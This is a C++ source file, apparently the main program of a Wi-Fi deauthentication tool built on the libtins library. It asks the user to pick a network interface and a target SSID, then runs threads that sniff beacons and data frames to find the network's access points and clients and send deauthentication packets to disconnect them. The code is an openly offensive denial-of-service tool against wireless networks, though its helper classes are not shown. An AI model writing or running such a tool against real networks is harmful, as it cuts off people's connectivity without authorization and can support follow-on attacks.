#include <iostream>
#include <tins/tins.h>
#include <vector>
#include "data_sniffer.hpp"
#include "deauth_sender.hpp"
#include "beacon_sniffer.hpp"

using namespace std;
using namespace Tins;

vector<NetworkInterface> interfaces;

void printInterfaces() {
    int i = 1;
    for (auto iface : interfaces) {
        cout << i << ". " << iface.name() << endl;
        i++;
    }
}

NetworkInterface selectInterface() {
    int index;
    cout << "input network driver number > ";
    cin >> index;
    return interfaces[index - 1];
}

string inputTarget() {
    string target;
    cout << "input target ssid > ";
    cin >> target;
    return target;
}

int main() {
    interfaces = NetworkInterface::all();
    printInterfaces();

    NetworkInterface iface = selectInterface();
    string target = inputTarget();

    BeaconSniffer *beaconSniffer = new BeaconSniffer(iface.name(), target);
    DataSniffer *dataSniffer = new DataSniffer(beaconSniffer->getAddressSet(), iface.name(), "wlp2s0");
    DeauthSender *sender = new DeauthSender(beaconSniffer->getAddressSet(), dataSniffer->getSet(), iface.name());

    thread beaconSniff = thread(&BeaconSniffer::beaconSniff, beaconSniffer);
    thread dataSniff = thread(&DataSniffer::dataSniff, dataSniffer);
    thread sendThread = thread(&DeauthSender::sendPacket, sender);

    beaconSniff.join();
    dataSniff.join();
    sendThread.join();
}